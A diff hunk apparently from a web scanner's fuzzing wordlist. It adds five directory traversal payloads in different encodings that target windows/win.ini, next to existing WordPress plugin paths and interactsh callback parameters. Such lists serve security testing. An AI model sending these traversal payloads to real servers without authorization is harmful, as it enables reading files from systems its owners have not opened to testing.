@@ -8787,3 +8787,8 @@ test&access={{interactsh-url}}&remote_url={{interactsh-url}}&admin={{interactsh-
 /wp-content/plugins/wp-malware-removal/readme.txt
 /wp-content/plugins/intelligent-importer/readme.txt
 /wp-content/plugins/exitintentpopup/readme.txt
+/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/windows/win.ini
+/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/windows/win.ini
+/..%5c..%5c..%5c..%5c..%5c..%5cwindows/win.ini
+/..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini
+/../../../../../../windows/win.ini
